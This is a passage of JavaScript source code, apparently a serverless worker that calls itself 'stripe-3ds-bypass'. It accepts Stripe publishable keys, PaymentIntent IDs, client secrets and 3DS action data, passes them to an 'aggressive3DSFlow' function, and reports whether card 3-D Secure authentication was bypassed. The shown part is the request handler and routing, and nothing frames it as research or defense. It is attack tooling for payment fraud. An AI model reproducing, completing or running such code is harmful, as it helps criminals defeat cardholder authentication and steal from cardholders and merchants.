    paymentIntent: outcome.paymentIntent || pi,
    sdkType,
    elapsedMs: Date.now() - start,
  };
}

async function handleFull(request) {
  const start = Date.now();
  let body;
  try {
    body = await request.json();
  } catch {
    return jsonRes({ status: "error", error: "invalid JSON", retryable: false }, 400);
  }

  const {
    publishableKey: pk,
    paymentIntentId: piId,
    clientSecret,
    nextAction,
    referer,
    paymentMethod,
  } = body || {};

  if (!pk || !nextAction) {
    return jsonRes({ status: "error", error: "missing publishableKey / nextAction", retryable: false }, 400);
  }

  const profile = resolveProfile(body);
  const ctx = resolve3DSContext(body);
  const { source, sdkType, serverTransId, methodUrl, fingerprintUrl, acsProfile } = ctx;

  if (!source) {
    const sdkInner = nextAction?.use_stripe_sdk || {};
    if ((sdkInner.type || "").includes("redirect") || sdkInner.three_d_secure_redirect_url) {
      return jsonRes({
        status: "challenge_required",
        bypassed: false,
        path: "redirect",
        elapsedMs: Date.now() - start,
      });
    }
    return jsonRes({ status: "error", error: "no 3DS source", retryable: false }, 400);
  }

  const result = await aggressive3DSFlow({
    pk,
    profile,
    referer,
    source,
    sdkType,
    serverTransId,
    methodUrl,
    fingerprintUrl,
    piId,
    clientSecret,
    paymentMethod,
    start,
    acsProfile,
  });
  return jsonRes(result, result.status === "error" ? 502 : 200);
}

export default {
  async fetch(request) {
    const url = new URL(request.url);
    if (request.method === "OPTIONS") return jsonRes({ ok: true });
    if (url.pathname === "/health") {
      return jsonRes({
        ok: true,
        service: "stripe-3ds-bypass",
        version: "5.3",
        maxPasses: MAX_AUTH_PASSES,
        browserJson: true,
        settle: "creq_poll_only",
      });
    }
    if (url.pathname === "/full" && request.method === "POST") {
      return handleFull(request);
    }
    return jsonRes({ error: "not found" }, 404);
  },
};
